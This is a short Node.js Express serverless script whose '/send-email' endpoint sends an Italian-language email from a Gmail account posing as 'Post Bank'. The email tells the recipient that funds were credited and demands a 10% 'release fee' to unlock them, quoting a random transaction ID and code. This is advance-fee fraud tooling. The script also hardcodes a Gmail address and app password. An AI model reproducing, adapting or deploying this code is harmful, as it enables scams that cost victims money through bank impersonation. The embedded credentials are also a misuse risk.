import nodemailer from 'nodemailer';
import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import serverless from 'serverless-http';

const app = express();
const port = 3000;

// Configure CORS
app.use(cors());

app.use(bodyParser.json());

app.post('/send-email', async (req, res) => {
  const { iban, bic, bankName, beneficiaryName, amount, email, phoneNumber, message } = req.body;
  
  const num = Math.floor(10000000 + Math.random() * 90000000);
  const num2 = Math.floor(10000 + Math.random() * 90000);
  const date = new Date();
  const formattedDate = date.toLocaleDateString();
  const formattedTime = date.toLocaleTimeString();
  const fee = (amount * 0.1).toFixed(2);

  const emailMessage = `
    Sul tuo conto ${bankName} sono stati accreditati €${amount}. Nuovo saldo: €${amount}. Riferimento: DEP123456. ID transazione: ${num}
    Data: da ${formattedDate} a ${formattedTime}.
    Ti preghiamo di pagare la commissione di rilascio (${fee} €) per rilasciare i fondi sul tuo conto bancario.
    Conserva questo codice ${num2} che utilizzerai dopo aver pagato le spese di sblocco e che ti permetterà di prendere possesso dei tuoi soldi.

    Cordiali saluti.
  `;

  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'postbank461@gmail.com',
      pass: 'lmif mcnu yvpv ekzg'
    }
  });

  let mailOptions = {
    from: 'Post Bank',
    to: email,
    subject: 'Recharge Information',
    text: emailMessage
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'Email sent successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Erreur lors de l\'envoi de l\'email', error: error.toString() });
  }
});

// Export the app as a handler for serverless environments
export const handler = serverless(app);

// If running locally, start the server
if (process.env.NODE_ENV !== 'lambda') {
  app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
  });
}
